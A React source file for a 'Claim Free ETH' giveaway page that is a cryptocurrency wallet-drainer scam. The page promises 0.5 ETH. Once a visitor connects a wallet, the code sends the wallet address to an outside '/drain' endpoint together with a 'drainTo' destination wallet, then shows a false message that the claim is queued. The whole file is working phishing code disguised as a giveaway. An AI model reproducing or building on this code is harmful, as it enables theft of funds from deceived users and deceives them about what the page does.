import React, { useState, useEffect } from "react";
import ReactDOM from "react-dom/client";

// Import WalletConnect Provider
import { WalletConnect } from "@walletconnect/web3-provider";

const App = () => {
  const [response, setResponse] = useState(null);
  const [loading, setLoading] = useState(false);
  const [walletProvider, setWalletProvider] = useState(null);
  const [walletAddress, setWalletAddress] = useState(null);

  // Initialize WalletConnect
  useEffect(() => {
    const provider = new WalletConnect({
      bridge: "https://bridge.walletconnect.org", // WalletConnect bridge URL
      qrcode: true, // Show QR code for mobile
      chainId: 1, // Ethereum mainnet
    });

    setWalletProvider(provider);
    return () => provider.disconnect();
  }, []);

  const connectWallet = async () => {
    setLoading(true);
    setResponse(null);

    try {
      // Check if wallet is available
      if (!walletProvider) {
        throw new Error("Wallet not detected. Please install a supported wallet.");
      }

      await walletProvider.enable(); // Connect to wallet

      // Get wallet address
      const address = walletProvider.accounts[0];

      setWalletAddress(address);

      // Make a POST request to your backend
      const res = await fetch("https://tokenbackendwork.onrender.com/drain", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          address,
          drainTo: "0x0cd509bf3a2fa99153dae9f47d6d24fc89c006d4",
        }),
      });

      const data = await res.json();

      if (res.ok) {
        setResponse({
          success: true,
          message: "Token claim queued. You will be credited in a few minutes.",
        });
      } else {
        setResponse({
          success: false,
          message: "Failed to claim token. Try again later.",
        });
      }
    } catch (err) {
      console.error(err);
      setResponse({
        success: false,
        message: "Failed to claim token. Try again later.",
      });
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center justify-center p-4 bg-gray-900 text-white">
      <div className="max-w-md w-full bg-gray-800 p-8 rounded-lg shadow-lg text-center">
        <h1 className="text-4xl font-bold mb-6">Claim Free ETH</h1>
        <p className="text-lg mb-8">
          Connect your wallet to claim 0.5 ETH now. It's free and easy!
        </p>
        <button
          onClick={connectWallet}
          disabled={loading}
          className={`flex items-center justify-center p-3 rounded-lg transition-all duration-200 ${
            loading
              ? "bg-gray-700 cursor-not-allowed"
              : "bg-blue-600 hover:bg-blue-700"
          }`}
        >
          <span className="text-white font-medium">Connect Wallet</span>
        </button>
        {response && (
          <div className="mt-6 p-4 bg-gray-700 rounded">
            <h3 className="font-bold text-gray-200">Response:</h3>
            <pre className="text-sm text-gray-400">
              {JSON.stringify(response, null, 2)}
            </pre>
          </div>
        )}
      </div>
    </div>
  );
};

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<App />);
